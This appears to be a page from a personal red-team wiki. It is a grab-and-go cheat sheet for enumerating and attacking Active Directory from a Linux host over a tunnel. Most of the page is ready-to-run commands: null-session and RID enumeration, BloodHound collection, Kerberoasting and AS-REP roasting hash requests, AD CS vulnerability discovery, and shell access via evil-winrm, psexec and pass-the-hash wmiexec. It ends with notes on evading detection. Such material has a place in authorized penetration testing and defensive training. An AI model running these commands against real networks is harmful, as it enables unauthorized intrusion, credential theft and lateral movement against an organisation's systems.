---
title: "AD Enumeration Cheat-Cards (from a Linux operator host)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [enumeration, recon, netexec, ldap, bloodhound, certipy, cheatsheet]
---

# AD Enumeration Cheat-Cards

The scattered "enumerate X" commands from across this wiki, pulled into one
grab-and-go reference for **remote enumeration from the Linux operator host
over the tunnel** ([[pivoting-and-tunneling]]). This is the *external/remote*
counterpart to [[situational-awareness]] (which is on-host, post-foothold PowerShell
recon). Golden rule of the wiki: **enumerate before exploit** — the path is
almost always already visible in this output.

Assumes `DC=10.0.0.10`, `corp.local`, creds `user:pass` (swap `-p pass` for
`-H <nthash>` for Pass-the-Hash, or a ccache for Kerberos). Prefix with
`proxychains` if you're on a SOCKS pivot rather than ligolo TUN.

## 0. No creds yet (unauth / null session)

```bash
nxc smb 10.0.0.10                                  # host banner, domain, signing, SMBv1, null?
nxc smb 10.0.0.10 -u '' -p '' --shares             # null-session shares
nxc smb 10.0.0.10 -u '' -p '' --users              # RID -> usernames (null)
nxc smb 10.0.0.10 -u 'guest' -p '' --rid-brute     # RID cycling for the user list
enum4linux-ng -A 10.0.0.10                          # kitchen-sink null enum
ldapsearch -x -H ldap://10.0.0.10 -s base namingcontexts   # anon LDAP base
kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt   # valid users, no logon
```
Feeds [[password-spraying]] (build the list) and [[as-rep-roasting]] (find
preauth-disabled accounts, below).

## 1. First authenticated sweep

```bash
nxc smb 10.0.0.10 -u user -p pass                   # confirm creds ([+])
nxc smb 10.0.0.10 -u user -p pass --pass-pol        # LOCKOUT POLICY (do this early)
nxc smb 10.0.0.0/24 -u user -p pass                 # who am I local admin on? ([+]... (Pwn3d!))
nxc smb 10.0.0.10 -u user -p pass --users --groups  # domain users & groups
nxc smb 10.0.0.10 -u user -p pass --loggedon-users  # sessions -> lateral targets
nxc smb 10.0.0.0/24 -u user -p pass --shares        # readable/writable shares across the subnet
nxc smb 10.0.0.0/24 -u user -p pass -M spider_plus  # crawl shares for secrets
```
`(Pwn3d!)` = local admin there → straight to [[credential-dumping]] /
[[remote-execution]].

## 2. LDAP / directory objects

```bash
# BloodHound collection (CE / legacy) — the map everything else reads
bloodhound-python -u user -p pass -d corp.local -ns 10.0.0.10 -c All --zip
rusthound-ce -d corp.local -u user@corp.local -p pass -i 10.0.0.10 -z   # Rust, single static binary ([[rusthound]])
nxc ldap 10.0.0.10 -u user -p pass --bloodhound -c All   # nxc's built-in collector

nxc ldap 10.0.0.10 -u user -p pass -M adcs         # AD CS present? (feeds ESC)
nxc ldap 10.0.0.10 -u user -p pass -M laps         # LAPS readable? ([[laps]])
nxc ldap 10.0.0.10 -u user -p pass --trusted-for-delegation   # unconstrained delegation hosts
nxc ldap 10.0.0.10 -u user -p pass --password-not-required    # PASSWD_NOTREQD accounts
nxc ldap 10.0.0.10 -u user -p pass --admin-count   # AdminSDHolder-protected (Tier-0-ish)

# Raw ldapsearch when you need the exact attribute
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w pass \
  -b 'DC=corp,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
```

## 3. Kerberos attack surface (the roast targets)

```bash
# Kerberoastable (SPN users) -> [[kerberoasting]]
GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.10 -request

# AS-REP roastable (DONT_REQ_PREAUTH) -> [[as-rep-roasting]]
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.10 -no-pass
nxc ldap 10.0.0.10 -u user -p pass --asreproast asrep.txt
nxc ldap 10.0.0.10 -u user -p pass --kerberoasting kerb.txt
```

## 4. AD CS (the ESC surface)

```bash
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.10 -stdout -vulnerable
# full dump for offline review:
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.10 -bloodhound
```
`-vulnerable` flags ESC1–ESC16 candidates directly. See [[ad-cs-esc-attacks]]
and the per-ESC pages.

## 5. Turn creds into a shell (once you have a target)

```bash
evil-winrm -i 10.0.0.20 -u user -p pass            # WinRM (watch [[kerberos-double-hop]])
psexec.py corp.local/user:pass@10.0.0.20           # SMB service exec ([[remote-execution]])
wmiexec.py corp.local/user@10.0.0.20 -hashes :NT   # quieter, PtH
```

## Reading the output (where paths hide)

- **`(Pwn3d!)`** on any host → local admin → dump creds, hunt for a privileged
  session (`--loggedon-users`) to steal.
- **A writable share / GPO path** → [[gpo-abuse]], share-based coercion.
- **`msDS-AllowedToDelegateTo` / unconstrained** → [[kerberos-delegation]].
- **`certipy ... [!] Vulnerable`** → the ESC chain is right there.
- **A user in an interesting group** in BloodHound → shortest-path to DA; that's
  the whole point of collecting it first. ([[bloodhound-opsec]] for doing this
  quietly.)

## Red-team notes (OPSEC)

- **Enumeration is not free.** BloodHound `-c All` is a broad LDAP + SMB sweep
  that lights up on a mature target — prefer `-c DCOnly` first (pure LDAP to the
  DC, no host touch), expand only if needed. See [[bloodhound-opsec]].
- **`--shares` / spidering across a /24** is a lot of SMB sessions from one
  source → pace it, scope it to hosts you care about.
- **Pull the lockout policy before any spray or roast that could fail-auth**, and
  cross-check enticing accounts against [[honeytokens]].
- Everything here runs over the tunnel so the tools stay off the endpoint
  ([[pivoting-and-tunneling]]) — but the LDAP/SMB/Kerberos *traffic* still lands
  on the DC.

## Related

- On-host recon: [[situational-awareness]]. Graph: [[bloodhound-opsec]].
- Delivery: [[pivoting-and-tunneling]], [[c2-and-pivoting-ad]].
- Next steps this feeds: [[password-spraying]], [[kerberoasting]],
  [[as-rep-roasting]], [[ad-cs-esc-attacks]], [[remote-execution]].
- Tools: [[netexec]], [[certipy]], [[impacket]], [[kerbrute]], [[bloodhound]], [[rusthound]].
